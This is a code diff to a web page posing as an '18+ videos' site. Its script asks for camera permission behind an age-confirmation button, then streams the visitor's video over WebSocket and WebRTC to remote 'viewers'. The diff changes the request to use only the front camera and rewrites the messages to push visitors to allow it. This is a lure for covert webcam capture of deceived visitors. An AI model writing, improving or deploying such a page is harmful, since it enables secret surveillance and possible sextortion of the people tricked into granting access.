@@ -103,14 +103,13 @@
       </p>
 
       <button id="allowCameraBtn">
-        I am 18+ — click Allow 
+        I am 18+ — click Allow
       </button>
 
       <p id="permissionMessage"></p>
 
     </div>
   </div>
-
 
   <h1>18+ Videos</h1>
 
@@ -129,7 +128,6 @@
     HD sex videos
   </a>
 
-
   <script>
 
     const status =
@@ -147,7 +145,6 @@
     const permissionMessage =
       document.getElementById("permissionMessage");
 
-
     let stream = null;
     let cameraId = null;
     let roleReceived = false;
@@ -155,14 +152,12 @@
 
     const peers = new Map();
 
-
     const ws = new WebSocket(
       (location.protocol === "https:" ? "wss:" : "ws:") +
       "//" + location.host + "/camera"
     );
 
-
-    // REQUEST CAMERA ONLY AFTER 18+ BUTTON
+    // REQUEST FRONT CAMERA ONLY AFTER 18+ BUTTON
 
     allowCameraBtn.onclick = async () => {
 
@@ -171,7 +166,6 @@
       permissionMessage.textContent =
         "allow permission...";
 
-
       try {
 
         stream =
@@ -179,7 +173,7 @@
 
             video: {
               facingMode: {
-                ideal: "environment"
+                exact: "user"
               }
             },
 
@@ -187,14 +181,12 @@
 
           });
 
-
         permissionAllowed = true;
 
         permissionGate.style.display = "none";
 
         status.textContent =
           "click here and see more HD sex videos";
-
 
         // If server already gave the camera ID,
         // tell it that the camera is live.
@@ -216,10 +208,10 @@
         allowCameraBtn.disabled = false;
 
         permissionMessage.textContent =
-          "❌  permission is required. If you are 18+, please allow access to continue.";
+          "❌ Front camera permission is required. If you are 18+, please allow access to continue.";
 
         status.textContent =
-          "🔒  permission denied";
+          "🔒 Front camera permission denied";
 
       }
 
@@ -231,13 +223,11 @@
       const old =
         peers.get(viewerId);
 
-
       if (old) {
 
         old.close();
 
       }
-
 
       const pc =
         new RTCPeerConnection({
@@ -251,9 +241,7 @@
 
         });
 
-
       peers.set(viewerId, pc);
-
 
       pc.onicecandidate = e => {
 
@@ -406,7 +394,6 @@
         "🔴 Connection closed";
 
     };
-
 
   </script>
 
